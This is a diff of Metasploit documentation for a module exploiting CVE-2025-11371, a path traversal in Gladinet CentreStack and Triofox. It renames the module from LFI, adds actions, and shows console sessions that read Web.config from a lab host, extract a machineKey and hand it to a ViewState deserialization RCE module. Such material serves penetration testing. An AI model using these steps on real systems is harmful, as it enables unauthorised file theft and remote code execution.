@@ -1,10 +1,14 @@
 ## Vulnerable Application
 
-A local file inclusion vulnerability (CVE-2025-11371) exists in Gladinet CentreStack and Triofox that allows an
+A path traversal vulnerability (CVE-2025-11371) exists in Gladinet CentreStack and Triofox that allows an
 unauthenticated attacker to read arbitrary files from the server's file system.
 
+**Note:** The official CVE advisory incorrectly refers to this as a "Local File Inclusion" (LFI) vulnerability.
+This is technically a path traversal vulnerability since the files are only read/disclosed, not included or executed.
+LFI implies code execution through file inclusion (like PHP's `include()`), which is not the case here.
+
 The vulnerability exists in the `/storage/t.dn` endpoint which does not properly sanitize the `s` parameter,
-allowing directory traversal attacks. This can be used to read sensitive files such as `Web.config` which
+allowing path traversal attacks. This can be used to read sensitive files such as `Web.config` which
 contains the `machineKey` used for ViewState deserialization attacks (CVE-2025-30406).
 
 * Gladinet CentreStack versions up to 16.10.10408.56683 are vulnerable.
@@ -32,12 +36,21 @@ You are now ready to test the module.
 ## Verification Steps
 
 - [ ] Start `msfconsole`
-- [ ] `use auxiliary/gather/gladinet_storage_lfi_cve_2025_11371`
+- [ ] `use auxiliary/gather/gladinet_storage_path_traversal_cve_2025_11371`
 - [ ] `set rhosts <ip-target>`
 - [ ] `set rport <port>` (default: 80)
-- [ ] `set filepath <file-to-read>` (default: `Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config`)
 - [ ] `run`
-- [ ] The module should read the file and extract the machineKey if it's a Web.config file
+- [ ] The module should read the Web.config file and extract the machineKey
+
+## Actions
+
+### EXTRACT_MACHINEKEY (default)
+
+Read the Web.config file and extract the machineKey for use with the RCE exploit module.
+
+### READ_FILE
+
+Read an arbitrary file from the target without attempting to extract the machineKey.
 
 ## Options
 
@@ -52,31 +65,23 @@ Path traversal depth (number of `..\` sequences). Default: `..\..\..\`
 This option allows you to adjust the path traversal depth based on the target's directory structure.
 You may need to increase or decrease the depth depending on where the application is installed.
 
-### EXTRACT_MACHINEKEY
-
-Whether to automatically extract the machineKey from Web.config if found. Default: `true`
-
 ## Scenarios
 
-### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Reading Web.config and extracting machineKey
+### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Extracting machineKey (default action)
 
 ```msf
-msf6 > use auxiliary/gather/gladinet_storage_lfi_cve_2025_11371
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set rhosts 192.168.1.21
+msf6 > use auxiliary/gather/gladinet_storage_path_traversal_cve_2025_11371
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set rhosts 192.168.1.21
 rhosts => 192.168.1.21
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set rport 80
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set rport 80
 rport => 80
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set ssl false
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set ssl false
 ssl => false
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set filepath "C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config"
-filepath => C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set extract_machinekey true
-extract_machinekey => true
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > run
 [*] Running module against 192.168.1.21
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target is vulnerable. LFI vulnerability confirmed (Build 16.1.10296.56315)
-[*] Attempting to read file via LFI: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
+[+] The target is vulnerable. Path traversal vulnerability confirmed (Build 16.1.10296.56315)
+[*] Attempting to read file via path traversal: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
 [+] Successfully read file: C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -155,7 +160,7 @@ msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
   
 </configuration>
 
-[+] File saved to: /home/chocapikk/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.file_441872.txt
+[+] File saved to: /home/user/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.file_441872.txt
 [+] Extracted machineKey from Web.config
 MachineKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
 
@@ -163,20 +168,22 @@ MachineKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD7
 [*] Set the MACHINEKEY option in the exploit module:
 use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
 set MACHINEKEY 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
-[+] MachineKey saved to: /home/chocapikk/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.machine_180409.txt
+[+] MachineKey saved to: /home/user/.msf4/loot/20251212190237_default_192.168.1.21_gladinet.machine_180409.txt
 [*] Auxiliary module execution completed
 ```
 
-### Reading an arbitrary file
+### Reading an arbitrary file (READ_FILE action)
 
 ```msf
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set filepath "Windows\System32\drivers\etc\hosts"
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set action READ_FILE
+action => READ_FILE
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > set filepath "Windows\System32\drivers\etc\hosts"
 filepath => Windows\System32\drivers\etc\hosts
-msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
+msf6 auxiliary(gather/gladinet_storage_path_traversal_cve_2025_11371) > run
 [*] Running module against 192.168.1.21
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target is vulnerable. LFI vulnerability confirmed
-[*] Attempting to read file via LFI: Windows\System32\drivers\etc\hosts
+[+] The target is vulnerable. Path traversal vulnerability confirmed
+[*] Attempting to read file via path traversal: Windows\System32\drivers\etc\hosts
 [+] Successfully read file: Windows\System32\drivers\etc\hosts
 
     # Copyright (c) 1993-2009 Microsoft Corp.
@@ -202,13 +209,13 @@ msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
     #	::1             localhost
 
 
-[+] File saved to: /home/chocapikk/.msf4/loot/20251212164258_default_192.168.1.21_gladinet.file_348807.txt
+[+] File saved to: /home/user/.msf4/loot/20251212164258_default_192.168.1.21_gladinet.file_348807.txt
 [*] Auxiliary module execution completed
 ```
 
 ## Limitations
 
-The LFI vulnerability requires directory traversal using Windows-style backslashes (`\`). The module automatically
+The path traversal vulnerability requires directory traversal using Windows-style backslashes (`\`). The module automatically
 prepends the `DEPTH` option value (default: `..\..\..\`) to the file path to escape from the web root directory.
 You can adjust the `DEPTH` option if the default value doesn't work for your target.
 
